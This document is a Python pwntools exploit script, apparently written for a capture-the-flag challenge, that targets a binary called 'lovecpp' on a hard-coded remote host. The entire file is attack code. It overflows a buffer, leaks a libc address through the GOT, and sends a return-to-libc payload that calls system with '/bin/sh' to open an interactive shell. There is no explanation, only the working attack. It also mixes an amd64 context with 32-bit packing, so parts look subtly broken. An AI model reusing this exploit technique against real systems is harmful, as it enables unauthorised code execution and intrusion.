from pwn import *
import time, sys

# local process envirnoment
LOCAL = False
elf_name = "./lovecpp"

#retmote args
remote_host = "140.113.209.24"
remote_port = 11004
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    puts_off = 0x05FCA0
    system_off = 0x3ADA0
    strlen_off = 0x7D2F0
    atoi_off = 0x02D250
    context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    #context.log_level = "debug"
    puts_off = 0x65650
    system_off = 0x40190
    atoi_off = 0x031860
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def cons_vuln():
    io.recvuntil("Please enter your name:")
    payload = 'a' + chr(0) + "/bin/sh"
    payload = payload.ljust(20, chr(0))
    payload +=  chr(0xFF)
    io.sendline(payload)
    #pause()
    io.recvuntil("10. C")
    io.sendline(str(10))
    io.recvuntil("did you like it?")

def s_exp():
    main_addr = 0x8048803
    name_addr = 0x804A190
    funco_stream =  0x8048660
    cout_stream = 0x804A100
    cons_vuln()
    payload = 'c'*0x1d + 'c'*0xc
    payload += p32(funco_stream)
    payload += p32(main_addr)
    payload += p32(cout_stream) + p32(elf.got['atoi'])
    io.sendline(payload)
    #pause()
    io.recvuntil("a nice day!\n")
    data = io.recv(4)
    atoi_addr = u32(data.ljust(4, chr(0)))
    libc_addr = atoi_addr - atoi_off
    system_addr = libc_addr + system_off
    log.info("libc address: "+hex(libc_addr))
    cons_vuln()
    payload = 'c'*0x1d + p32(1)
    payload += p32(system_addr)
    payload += p32(main_addr)
    payload += p32(name_addr+2)
    pause()
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
